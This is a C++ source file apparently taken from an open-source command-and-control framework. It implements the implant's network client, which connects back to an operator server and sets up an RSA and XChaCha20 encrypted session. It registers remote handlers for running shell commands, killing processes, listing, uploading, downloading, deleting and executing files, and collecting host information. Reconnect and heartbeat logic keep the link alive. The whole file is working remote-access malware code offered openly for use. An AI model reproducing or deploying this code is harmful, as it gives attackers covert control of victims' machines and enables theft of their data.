/*
 * Copyright (c) 2021.  https://github.com/geemion
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "yasio/obstream.hpp"
#include "netio.h"
#include "protocol_header.h"
#include "taskdata.pb.h"
#include "netio.pb.h"
#include "cmdexec/cmdexec.h"
#include "beacon/beacon.h"
#include "../base/log/log.h"

netio_service::netio_service(std::string ip, u_short port, int netio_kind) :
	service_(io_hostent{ ip, port }), handler_(*this), netio_kind_(netio_kind), session_id_(0), transport_(nullptr)
{

}

netio_service::~netio_service()
{

}

void netio_service::start(const highp_time_t& ht_interval)
{
	ht_interval_ = ht_interval;
	service_.set_option(YOPT_S_DEFERRED_EVENT, 0);
	service_.set_option(YOPT_C_LFBFD_PARAMS, 0, 1024 * 1024 * 1024, 0, sizeof(int), sizeof(netio_header));

	service_.start([&](event_ptr&& event) {
		switch (event->kind())
		{
		case YEK_PACKET: {
			on_packet(event);
			break;
		}
		case YEK_CONNECT_RESPONSE: {
			on_connected(event);
			break;
		}
		case YEK_CONNECTION_LOST: {
			on_connect_lost(event);
			break;
		}
		}
	});

	//msg_handler  
	handler_.set_msg_handler(c2::HOST_INFO_REQ, exec::task_get_host_info);
	handler_.set_msg_handler(c2::PROCESS_INFO, exec::task_get_process_list);
	handler_.set_msg_handler(c2::PROCESS_KILL, exec::task_kill_process);
	handler_.set_msg_handler(c2::DISK_LIST, exec::task_get_disk_list);
	handler_.set_msg_handler(c2::FILE_LIST, exec::task_get_file_list);
	handler_.set_msg_handler(c2::CMD_COMMAND, exec::task_get_cmd_rsp);
	handler_.set_msg_handler(c2::UPLOAD_FILE, exec::task_upload_file);
	handler_.set_msg_handler(c2::DOWNLOAD_FILE, exec::task_download_file);
	handler_.set_msg_handler(c2::DELETE_FILE, exec::task_delete_file);
	handler_.set_msg_handler(c2::EXEC_FILE, exec::task_exec_file);

	service_.open(0, get_yasio_conn_kind());

	//reconnect
	if (beacon::get_reconnect_time() > 0)
		service_.schedule(std::chrono::seconds(beacon::get_reconnect_time()), [this](io_service& service)->bool {
		if (!service_.is_open(0))
		{
			service_.open(0, get_yasio_conn_kind());
		}
		return false;
	});

	handler_.start_handler();
}

int netio_service::get_yasio_conn_kind()
{
	switch (netio_kind_)
	{
	case c2::CONNNAME_TCP:
		return YCK_TCP_CLIENT;
	case c2::CONNNAME_UDP:
		return YCK_UDP_CLIENT;
	default:
		return YCK_TCP_CLIENT;
	}
	return YCK_TCP_CLIENT;
}

void netio_service::on_connected(event_ptr& event)
{
	transport_ = event->transport();

	std::vector<char> buffer;
	send_data(buffer, false, c2::PUBKEY_REQ, 0, nullptr);

	init_session_key();
}

void netio_service::on_packet(event_ptr& event)
{
	if (event->packet().empty())
		return;

	netio_header* header = (netio_header*)event->packet().data();
	auto data_size = yasio::network_to_host(header->size);
	auto task_data = std::vector<char>(event->packet().begin() + sizeof(netio_header), event->packet().end());
	if (data_size != task_data.size())
	{
		LOG_ERROR("error size:%d, %d", data_size, task_data.size());
		return;
	}

	if (data_size == 0)
		return;

	if (!header->encrypted) {
		on_auth(header->session_id, task_data);
	}
	else {
		xchacha20(session_key_, &session_key_[xchacha20_key_len], (uint8_t*)task_data.data(), task_data.size());
		handler_.put_msg(std::move(task_data));
	}
}

void netio_service::on_connect_lost(event_ptr& event)
{
	service_.close(0);
	LOG_DEBUG("connect lost");
}

void netio_service::on_auth(const uint64_t& session_id, const std::vector<char>& packet)
{
	c2::TaskData task_data;
	if (!task_data.ParseFromArray(packet.data(), packet.size()))
	{
		LOG_ERROR("error  parse packet");
		return;
	}

	auto msg_id = task_data.msg_id();
	if (msg_id == c2::AUTH_RSP)
	{
		start_heartbeat_timer();
	}
	else if (msg_id == c2::PUBKEY_RSP)
	{
		auto data = task_data.byte_value();
		c2::AuthRsaKey pubkey;
		if (!pubkey.ParseFromString(data))
		{
			LOG_ERROR("error pubkey packet");
			return;
		}

		std::vector<char> encrypted_session_key;
		auto enc_size = rsa_pub_encrypt(pubkey.pn().c_str(), pubkey.pe().c_str(), session_key_, sizeof(session_key_), encrypted_session_key);
		if (!enc_size)
		{
			LOG_ERROR("error  encrypt pubkey");
			return;
		}
		session_id_ = session_id;
		send_data(encrypted_session_key, false, c2::AUTH_REQ);
	}
}

int netio_service::send_data(std::vector<char> buffer, bool enc_data /*= true*/, completion_cb_t comp_cb /*= nullptr*/)
{
	netio_header header(yasio::host_to_network(buffer.size(), 4), enc_data, session_id_);
	obstream obs;

	if (enc_data)
		xchacha20(session_key_, &session_key_[xchacha20_key_len], (uint8_t*)buffer.data(), buffer.size());

	obs.write_bytes(&header, sizeof(header));
	obs.write_bytes(buffer.data(), buffer.size());

	return service_.write(transport_, std::move(obs.buffer()), comp_cb);
}

int netio_service::send_data(std::vector<char> buffer, bool enc_data, int msg_id, uint64_t task_id /*= 0*/, completion_cb_t comp_cb /*= nullptr*/)
{
	auto get_nonce = []()->std::string {
		srand(time(NULL));
		auto len = (uint8_t)(rand() % 10) + 5;
		std::string nonce;
		nonce.resize(len);
		for (size_t i = 0; i < nonce.size(); i++)
		{
			nonce[i] = (uint8_t)(rand() % 255);
		}
		return nonce;
	};

	c2::TaskData  task_data;
	task_data.set_msg_id(msg_id);
	task_data.set_beacon_id(beacon::get_beacon_id());
	task_data.set_nonce(std::move(get_nonce()));
	task_data.set_task_id(task_id);
	task_data.set_byte_value(buffer.data(), buffer.size());

	std::vector<char> task_data_buffer(task_data.ByteSizeLong());
	task_data.SerializePartialToArray(task_data_buffer.data(), task_data_buffer.size());

	last_send_time_ = yasio::highp_clock() / (1000 * 1000);

	return send_data(task_data_buffer, enc_data, comp_cb);
}

void netio_service::init_session_key()
{
	generate_random_block(session_key_, sizeof(session_key_));
}

void netio_service::start_heartbeat_timer()
{
	heartbeat_timer_.expires_from_now(std::chrono::seconds(ht_interval_));
	heartbeat_timer_.async_wait(service_, [this](io_service& service) -> bool {
		if (yasio::highp_clock() / (1000 * 1000) - last_send_time_ >= ht_interval_ / 2)
		{
			std::vector<char> buffer;
			exec::get_host_info(buffer);
			send_data(buffer, true, c2::HEAT_BEAT_REQ, 0, nullptr);
		}
		return false;
	});
}
